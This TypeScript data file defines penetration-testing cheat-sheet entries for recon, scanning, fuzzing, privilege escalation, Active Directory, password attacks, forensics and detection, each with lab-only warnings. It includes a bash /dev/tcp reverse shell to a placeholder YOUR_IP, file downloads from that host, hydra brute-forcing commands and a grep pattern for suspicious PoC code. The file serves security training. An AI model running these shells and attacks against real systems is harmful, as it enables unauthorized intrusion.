import type { SecurityIconName } from './security-icons';

export type CheatSheetCategory =
  | 'Recon'
  | 'Nmap'
  | 'Web Enumeration'
  | 'Fuzzing'
  | 'CVE Research'
  | 'Exploit Research'
  | 'Linux PrivEsc'
  | 'Windows PrivEsc'
  | 'Active Directory'
  | 'Reverse Shells'
  | 'File Transfer'
  | 'Password Attacks'
  | 'Forensics'
  | 'Malware Analysis'
  | 'SOC / Detection'
  | 'Useful Links';

export type CheatSheetCommand = {
  label: string;
  code: string;
  copy?: boolean;
};

export type CheatSheetLink = {
  label: string;
  href: string;
};

export type CheatSheetEntry = {
  id: string;
  title: string;
  category: CheatSheetCategory;
  description: string;
  icon: SecurityIconName;
  tags: string[];
  warning?: string;
  commands: CheatSheetCommand[];
  notes: string[];
  links?: CheatSheetLink[];
};

export const categoryOrder: CheatSheetCategory[] = [
  'Recon',
  'Nmap',
  'Web Enumeration',
  'Fuzzing',
  'CVE Research',
  'Exploit Research',
  'Linux PrivEsc',
  'Windows PrivEsc',
  'Active Directory',
  'Reverse Shells',
  'File Transfer',
  'Password Attacks',
  'Forensics',
  'Malware Analysis',
  'SOC / Detection',
  'Useful Links'
];

export const cheatSheets: CheatSheetEntry[] = [
  {
    id: 'recon-basics',
    title: 'Recon Baseline',
    category: 'Recon',
    description: 'First-pass DNS, ownership, TLS, and HTTP checks before deeper enumeration.',
    icon: 'radar',
    tags: ['dns', 'http', 'headers', 'tls', 'scope'],
    warning: 'Run only against lab targets, owned assets, or approved scope.',
    commands: [
      { label: 'WHOIS lookup', code: 'whois example.com', copy: true },
      { label: 'DNS records', code: 'dig example.com A AAAA MX TXT NS +short', copy: true },
      { label: 'Resolver check', code: 'nslookup example.com 1.1.1.1', copy: true },
      { label: 'HTTP headers', code: 'curl -I https://example.com', copy: true }
    ],
    notes: [
      'Write down scope boundaries before scanning.',
      'Compare DNS results across resolvers when answers look inconsistent.',
      'Headers can reveal proxies, framework hints, cookies, and security controls.'
    ]
  },
  {
    id: 'nmap-core',
    title: 'Nmap Core Scans',
    category: 'Nmap',
    description: 'A compact scan ladder for CTF and authorized pentest service discovery.',
    icon: 'target',
    tags: ['ports', 'services', 'udp', 'scripts', 'output'],
    commands: [
      { label: 'Quick TCP scan', code: 'sudo nmap -Pn -sS --top-ports 1000 -oA scans/quick TARGET_IP', copy: true },
      { label: 'Full TCP scan', code: 'sudo nmap -Pn -p- --min-rate 5000 -oA scans/all TARGET_IP', copy: true },
      { label: 'Service scan', code: 'sudo nmap -Pn -sCV -p PORTS -oA scans/services TARGET_IP', copy: true },
      { label: 'UDP top ports', code: 'sudo nmap -Pn -sU --top-ports 50 -oA scans/udp TARGET_IP', copy: true }
    ],
    notes: [
      'Use `-oA` so you keep normal, grepable, and XML output.',
      'Do not treat a fast scan as complete coverage.',
      'UDP scans are slower. Start small, then expand when needed.'
    ]
  },
  {
    id: 'web-enum',
    title: 'Web Enumeration',
    category: 'Web Enumeration',
    description: 'HTTP checks for vhosts, responses, source hints, and authenticated workflow mapping.',
    icon: 'search',
    tags: ['curl', 'vhosts', 'burp', 'headers', 'source'],
    commands: [
      { label: 'Fetch response headers', code: 'curl -i http://target.local/', copy: true },
      { label: 'Check vhost', code: 'curl -H "Host: app.target.local" -i http://TARGET_IP/', copy: true },
      { label: 'List linked assets', code: 'curl -s http://target.local/ | grep -Eoi \'(href|src)="[^"]+\' | cut -d\'"\' -f2 | sort -u', copy: true },
      { label: 'Save page for review', code: 'curl -s http://target.local/ -o page.html', copy: true }
    ],
    notes: [
      'Map application roles and state-changing requests in Burp before testing.',
      'Review JavaScript for API paths, feature flags, and client-side route names.',
      'Use placeholders in notes until you verify exact endpoints.'
    ]
  },
  {
    id: 'fuzzing-directories',
    title: 'Directory and Content Fuzzing',
    category: 'Fuzzing',
    description: 'Safe discovery patterns for routes, extensions, and virtual hosts.',
    icon: 'tool',
    tags: ['ffuf', 'gobuster', 'feroxbuster', 'wordlists', 'vhost'],
    warning: 'Tune rate limits for production tests and follow the engagement rules.',
    commands: [
      { label: 'ffuf directories', code: 'ffuf -u http://target.local/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc all -fc 404', copy: true },
      { label: 'ffuf vhosts', code: 'ffuf -u http://TARGET_IP/ -H "Host: FUZZ.target.local" -w subdomains.txt -fs SIZE_TO_FILTER', copy: true },
      { label: 'gobuster dirs', code: 'gobuster dir -u http://target.local/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak', copy: true },
      { label: 'feroxbuster light', code: 'feroxbuster -u http://target.local/ -w /usr/share/wordlists/dirb/common.txt -x php,txt --rate-limit 25', copy: true }
    ],
    notes: [
      'Filter by status, size, and words after getting a baseline 404.',
      'Record wordlist and filters so findings are reproducible.',
      'Avoid blind recursive fuzzing on fragile or out-of-scope systems.'
    ]
  },
  {
    id: 'cve-research',
    title: 'CVE Research Workflow',
    category: 'CVE Research',
    description: 'Evidence-driven vulnerability research without inventing affected versions or exploitability.',
    icon: 'file',
    tags: ['cve', 'cvss', 'cwe', 'kev', 'epss', 'advisory'],
    commands: [
      { label: 'Search template', code: '"PRODUCT" "VERSION" CVE advisory', copy: true },
      { label: 'Exploit query template', code: '"CVE-YYYY-NNNN" exploit PoC analysis', copy: true },
      { label: 'Patch query template', code: '"PRODUCT" "VERSION" fixed in security advisory', copy: true }
    ],
    notes: [
      'Placeholder format: CVE-YYYY-NNNN, vendor advisory, affected version, fixed version, CVSS, CWE, exploitability notes, patch status.',
      'Prefer vendor advisories and primary sources before blog posts.',
      'Confirm whether the vulnerable feature is reachable in your target context.'
    ],
    links: [
      { label: 'NVD', href: 'https://nvd.nist.gov/' },
      { label: 'MITRE CVE', href: 'https://cve.mitre.org/' },
      { label: 'CISA KEV', href: 'https://www.cisa.gov/known-exploited-vulnerabilities-catalog' },
      { label: 'FIRST EPSS', href: 'https://www.first.org/epss/' },
      { label: 'CVSS Calculator', href: 'https://www.first.org/cvss/calculator/3.1' },
      { label: 'CWE', href: 'https://cwe.mitre.org/' }
    ]
  },
  {
    id: 'exploit-research',
    title: 'Exploit Research Checklist',
    category: 'Exploit Research',
    description: 'A repeatable way to evaluate public PoCs before using them in a lab.',
    icon: 'flask',
    tags: ['poc', 'triage', 'patch', 'lab', 'opsec'],
    warning: 'Read code before running it. Treat public PoCs as untrusted software.',
    commands: [
      { label: 'Static review', code: 'grep -RniE "curl|wget|socket|subprocess|os.system|exec|eval|base64" ./poc-directory', copy: true },
      { label: 'Isolated test env', code: 'python3 -m venv .venv && source .venv/bin/activate', copy: true },
      { label: 'Container lab note', code: 'docker run --rm -it --network none IMAGE_NAME /bin/bash', copy: true }
    ],
    notes: [
      'Validate target version, configuration, authentication state, and reachable attack surface.',
      'Prefer reproducing the vulnerable condition over blind exploit execution.',
      'Keep exploit artifacts separated from client or personal files.'
    ],
    links: [
      { label: 'Exploit-DB', href: 'https://www.exploit-db.com/' },
      { label: 'GitHub Advisories', href: 'https://github.com/advisories' }
    ]
  },
  {
    id: 'linux-privesc',
    title: 'Linux Privilege Escalation',
    category: 'Linux PrivEsc',
    description: 'Low-noise local checks after an authorized shell in a CTF or lab.',
    icon: 'terminal',
    tags: ['linux', 'sudo', 'suid', 'capabilities', 'cron'],
    commands: [
      { label: 'Identity and host', code: 'id; hostname; uname -a; cat /etc/os-release 2>/dev/null', copy: true },
      { label: 'Sudo rights', code: 'sudo -l', copy: true },
      { label: 'SUID files', code: 'find / -perm -4000 -type f 2>/dev/null', copy: true },
      { label: 'Capabilities', code: 'getcap -r / 2>/dev/null', copy: true },
      { label: 'Writable paths', code: 'find / -writable -type d 2>/dev/null | grep -vE "^/proc|^/sys|^/dev"', copy: true }
    ],
    notes: [
      'Check config files for credentials before reaching for kernel exploits.',
      'Correlate cron jobs with writable scripts and PATH assumptions.',
      'Document every privilege boundary crossed.'
    ]
  },
  {
    id: 'windows-privesc',
    title: 'Windows Privilege Escalation',
    category: 'Windows PrivEsc',
    description: 'Windows local enumeration commands for labs and approved testing.',
    icon: 'platform',
    tags: ['windows', 'powershell', 'services', 'tasks', 'privileges'],
    commands: [
      { label: 'Identity and privileges', code: 'whoami /all', copy: true },
      { label: 'System details', code: 'systeminfo', copy: true },
      { label: 'Service review', code: 'wmic service get name,displayname,pathname,startmode | findstr /i "auto"', copy: true },
      { label: 'Scheduled tasks', code: 'schtasks /query /fo LIST /v', copy: true },
      { label: 'PowerShell paths', code: 'Get-ChildItem Env:Path; Get-LocalUser 2>$null', copy: true }
    ],
    notes: [
      'Look for service paths, weak file permissions, and credential reuse.',
      'Confirm OS build before researching local privilege escalation CVEs.',
      'Avoid changing services until you understand recovery impact.'
    ]
  },
  {
    id: 'active-directory-enum',
    title: 'Active Directory Enumeration',
    category: 'Active Directory',
    description: 'Domain discovery and graph collection flow for authorized AD labs.',
    icon: 'network',
    tags: ['ad', 'ldap', 'kerberos', 'bloodhound', 'domain'],
    warning: 'Only enumerate domains where you have written authorization.',
    commands: [
      { label: 'Domain context', code: 'whoami /fqdn && nltest /dsgetdc:DOMAIN.LOCAL', copy: true },
      { label: 'LDAP root DSE', code: 'ldapsearch -x -H ldap://DC_IP -s base namingcontexts', copy: true },
      { label: 'Kerberos userenum placeholder', code: 'kerbrute userenum --dc DC_IP -d DOMAIN.LOCAL users.txt', copy: true },
      { label: 'BloodHound collection placeholder', code: 'bloodhound-python -d DOMAIN.LOCAL -u USER -p PASS -ns DC_IP -c All', copy: true }
    ],
    notes: [
      'Start with domain, DC, DNS, and time sync checks.',
      'Use graph tools to reason about relationships, not as a replacement for validation.',
      'Store credentials and collection output securely.'
    ]
  },
  {
    id: 'reverse-shells',
    title: 'Reverse Shell Placeholders',
    category: 'Reverse Shells',
    description: 'Common lab shell patterns with explicit placeholder values.',
    icon: 'terminal',
    tags: ['shell', 'listener', 'tcp', 'stabilization'],
    warning: 'Use these only in CTF, lab, or approved testing environments.',
    commands: [
      { label: 'Listener', code: 'nc -lvnp 4444', copy: true },
      { label: 'Bash placeholder', code: 'bash -c \'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1\'', copy: true },
      { label: 'Python pty', code: 'python3 -c \'import pty; pty.spawn("/bin/bash")\'', copy: true },
      { label: 'TTY basics', code: 'export TERM=xterm; stty rows 40 cols 120', copy: true }
    ],
    notes: [
      'Replace YOUR_IP with your VPN or lab interface address.',
      'Prefer stable, logged, authorized access methods when available.',
      'Record where the shell came from and which user context it runs under.'
    ]
  },
  {
    id: 'file-transfer',
    title: 'File Transfer',
    category: 'File Transfer',
    description: 'Simple transfer patterns for moving tools, logs, and evidence in labs.',
    icon: 'archive',
    tags: ['http', 'scp', 'curl', 'wget', 'powershell'],
    commands: [
      { label: 'Serve current directory', code: 'python3 -m http.server 8000', copy: true },
      { label: 'Linux download', code: 'curl -O http://YOUR_IP:8000/file.txt', copy: true },
      { label: 'wget download', code: 'wget http://YOUR_IP:8000/file.txt -O file.txt', copy: true },
      { label: 'PowerShell download', code: 'iwr http://YOUR_IP:8000/file.txt -OutFile file.txt', copy: true },
      { label: 'SCP copy', code: 'scp file.txt user@TARGET_IP:/tmp/file.txt', copy: true }
    ],
    notes: [
      'Hash evidence before and after transfer when integrity matters.',
      'Avoid placing tools in sensitive production directories.',
      'Remove temporary listeners when finished.'
    ]
  },
  {
    id: 'password-attacks',
    title: 'Password Attack Workflow',
    category: 'Password Attacks',
    description: 'Controlled hash cracking and password audit commands for authorized scenarios.',
    icon: 'shield',
    tags: ['hashcat', 'john', 'hydra', 'wordlists', 'audit'],
    warning: 'Do not test credentials against systems outside written scope.',
    commands: [
      { label: 'Identify hash', code: 'hashid hash.txt', copy: true },
      { label: 'Hashcat bcrypt example', code: 'hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt --username', copy: true },
      { label: 'John format example', code: 'john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt', copy: true },
      { label: 'Lab login test placeholder', code: 'hydra -L users.txt -P passwords.txt TARGET_IP ssh -t 4 -V', copy: true }
    ],
    notes: [
      'Prefer offline hash cracking when hashes are legitimately obtained.',
      'Rate-limit online tests and follow lockout policies.',
      'Never store recovered passwords in public reports unless explicitly required and sanitized.'
    ]
  },
  {
    id: 'forensics-quick',
    title: 'Forensics Quick Commands',
    category: 'Forensics',
    description: 'Fast triage commands for files, metadata, strings, memory, and timelines.',
    icon: 'search',
    tags: ['strings', 'exiftool', 'volatility', 'timeline', 'triage'],
    commands: [
      { label: 'File type', code: 'file sample.bin', copy: true },
      { label: 'Strings', code: 'strings -a sample.bin | less', copy: true },
      { label: 'Metadata', code: 'exiftool evidence.jpg', copy: true },
      { label: 'Hashes', code: 'sha256sum evidence.*', copy: true },
      { label: 'Volatility placeholder', code: 'volatility3 -f memory.raw windows.info', copy: true }
    ],
    notes: [
      'Work from a copy, not original evidence.',
      'Keep timestamps, timezone, and hash values attached to each artifact.',
      'Build a timeline before jumping to conclusions.'
    ]
  },
  {
    id: 'malware-analysis',
    title: 'Malware Analysis Flow',
    category: 'Malware Analysis',
    description: 'Static-first workflow for safe lab analysis and behavior mapping.',
    icon: 'flask',
    tags: ['static', 'dynamic', 'yara', 'mitre', 'sandbox'],
    warning: 'Analyze only in an isolated malware lab with no shared clipboard or mounted personal folders.',
    commands: [
      { label: 'Hashes', code: 'sha256sum sample.bin && md5sum sample.bin', copy: true },
      { label: 'Static strings', code: 'strings -a -n 6 sample.bin | tee strings.txt', copy: true },
      { label: 'PE headers placeholder', code: 'pefile sample.exe', copy: true },
      { label: 'YARA scan placeholder', code: 'yara -r rules.yar sample-directory/', copy: true }
    ],
    notes: [
      'Flow: static review, controlled dynamic run, behavior notes, MITRE mapping, detection ideas.',
      'Never run unknown samples on your host OS.',
      'Document network indicators without beaconing to real infrastructure.'
    ]
  },
  {
    id: 'soc-detection',
    title: 'SOC and Log Analysis',
    category: 'SOC / Detection',
    description: 'Triage prompts and query placeholders for alert review and detection engineering.',
    icon: 'shield',
    tags: ['soc', 'sigma', 'yara', 'ioc', 'timeline', 'triage'],
    commands: [
      { label: 'IOC extraction idea', code: 'grep -Eio "([0-9]{1,3}\\.){3}[0-9]{1,3}|[a-f0-9]{64}|https?://[^ ]+" alert.log | sort -u', copy: true },
      { label: 'Linux auth failures', code: 'grep -i "failed password" /var/log/auth.log | tail -50', copy: true },
      { label: 'Sigma placeholder', code: 'sigma-cli convert -t splunk rule.yml', copy: true },
      { label: 'YARA placeholder', code: 'yara -r detection-rules.yar samples/', copy: true }
    ],
    notes: [
      'Triage: validate alert, scope blast radius, extract IOCs, map tactics, contain, preserve evidence.',
      'Separate observed facts from assumptions.',
      'Tune detections with known-good activity before broad deployment.'
    ]
  },
  {
    id: 'useful-links',
    title: 'Useful Security References',
    category: 'Useful Links',
    description: 'High-signal references for daily CTF, lab, and defensive research work.',
    icon: 'external',
    tags: ['references', 'docs', 'training', 'databases'],
    commands: [
      { label: 'Search syntax', code: 'site:docs.vendor.com PRODUCT VERSION security advisory', copy: true },
      { label: 'GitHub code search', code: '"PRODUCT" "VERSION" "CVE-YYYY-NNNN"', copy: true }
    ],
    notes: [
      'Use public references for structure, then write your own notes from verified lab evidence.',
      'Keep links current during report finalization.',
      'Do not paste massive payload lists into writeups without context.'
    ],
    links: [
      { label: 'OWASP Web Security Testing Guide', href: 'https://owasp.org/www-project-web-security-testing-guide/' },
      { label: 'MITRE ATT&CK', href: 'https://attack.mitre.org/' },
      { label: 'GTFOBins', href: 'https://gtfobins.github.io/' },
      { label: 'LOLBAS', href: 'https://lolbas-project.github.io/' },
      { label: 'CyberChef', href: 'https://gchq.github.io/CyberChef/' }
    ]
  }
];

export const cveResearchLinks: CheatSheetLink[] = [
  { label: 'NVD', href: 'https://nvd.nist.gov/' },
  { label: 'MITRE CVE', href: 'https://cve.mitre.org/' },
  { label: 'Vendor advisories', href: 'https://www.cisa.gov/resources-tools/resources/free-cybersecurity-services-and-tools' },
  { label: 'GitHub advisory database', href: 'https://github.com/advisories' },
  { label: 'Exploit-DB', href: 'https://www.exploit-db.com/' },
  { label: 'CISA KEV', href: 'https://www.cisa.gov/known-exploited-vulnerabilities-catalog' },
  { label: 'FIRST EPSS', href: 'https://www.first.org/epss/' },
  { label: 'CVSS calculator', href: 'https://www.first.org/cvss/calculator/3.1' },
  { label: 'CWE database', href: 'https://cwe.mitre.org/' }
];
